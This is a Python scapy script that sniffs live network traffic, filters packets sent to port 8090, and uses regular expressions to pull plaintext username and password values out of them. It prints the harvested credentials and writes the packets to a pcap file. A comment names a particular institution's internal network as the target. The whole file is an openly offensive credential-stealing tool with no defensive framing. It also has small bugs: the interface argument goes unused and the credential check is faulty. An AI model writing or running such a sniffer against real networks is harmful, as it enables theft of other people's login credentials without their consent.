import scapy.all as scapy
from scapy.layers import http
import argparse
import re


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="Interface", help="Specify the interface")
    options = parser.parse_args()
    if not options.Interface:
        parser.error("Please specify the interface")
    return options

def sniff(interface: str):
    # Filter can be applied for port 8090 for accessing just the login credentials
    scapy.sniff(store=0, prn=process_sniffed_packet)


# Field in the layers are accessed using the dot operator
def process_sniffed_packet(packet):
    # if packet.haslayer(http.HTTPRequest):
    #     print("test")
    #     if packet.haslayer(scapy.Raw):
    #         print(packet[scapy.Raw].load)
    if packet.haslayer(scapy.TCP):
        if packet[scapy.TCP].dport == 8090:
            if packet.haslayer(scapy.Raw):
                print(packet.show())
    login_credentials = get_login_credentials(packet)
    if login_credentials:
        print(login_credentials)
    scapy.wrpcap("output_new.pcap", packet, append=True)

def get_login_credentials(packet):
    login_credentials = {}
    # Checks the TCP layer for any raw data, as in the case for the internal network of SJCE
    if packet.haslayer(scapy.TCP):
        if packet[scapy.TCP].dport == 8090:
            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load
                if "username" and "password" in str(load):
                    username = re.findall(r"username=([^&]+)", str(load))
                    password = re.findall(r"password=([^&]+)", str(load))
                    if username[0] not in login_credentials.keys():
                        login_credentials[username[0]] = password[0]
                        return login_credentials

options = get_arguments()

sniff(options.Interface)

